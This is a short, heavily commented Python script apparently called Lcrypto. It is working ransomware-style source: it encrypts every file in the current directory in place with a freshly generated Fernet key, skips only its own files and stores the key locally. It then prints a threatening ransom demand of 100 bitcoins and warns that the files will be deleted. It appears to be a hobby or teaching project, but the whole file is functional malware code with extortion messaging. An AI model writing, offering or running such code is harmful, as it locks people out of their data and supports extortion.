# This is the main file using which Lcrypto will encrypt your files!
import os # Importing the bulit-in os module in python
from cryptography.fernet import Fernet # Importing the built-in cryptography module in python

# Let's define a main() function here
def main():
    try:
        files = [] # Here the files=[] is an empty list where later on we will append our directory files
    
        for file in os.listdir(): # For loop to check all the available files in the current directory
            # Now we need to make sure that Lcrypto doesn't encrypts Lcrypto.py, Lcrypto-key,key and Lcrypto-decrypt.py!
            if file == "Lcrypto.py" or file == "Lcrypto-key.key"  or file == "Lcrypto-decrypt.py" or file == "Lcrypto.exe" or file == "Lcrypto-decrypt.exe":
                continue # So we will skip them
            if os.path.isfile(file): # Checking if its a valid file or not
                files.append(file) # Appending all the available files to the files=[] list

        #print(files) use this print all the available files

        key = Fernet.generate_key() # Generating a random key from Fernet

        with open("Lcrypto-key.key", "wb") as thekey: # Opening the Lcrypto-key.key file where the key will be stored
            thekey.write(key) # Let's write the key to the file

        for file in files: # For loop for encrypting all the files
            with open(file, "rb") as thefile: # Opening every files
                contents = thefile.read() # Reading the files
            contents_encrypted = Fernet(key).encrypt(contents) # And at last encrypting it!!

            with open(file, "wb") as thefile: # Lastly writing the encrypted contents back the file
                thefile.write(contents_encrypted) # And here you go your files have been encrypted!!!
    
        # Printing a simple alert message to the user!
        print("Oops! Your files have been encrypted!\nTrying to kill Lcrypto will result in permanent deletion of your files!")
        print("\nPay me 100 bitcoins within 24 hrs to unlock your files or else they will get deleted!")
    except KeyboardInterrupt:
        return print("Lcrypto will be back!")


# Runniing the main() function
if __name__ == "__main__":
    main()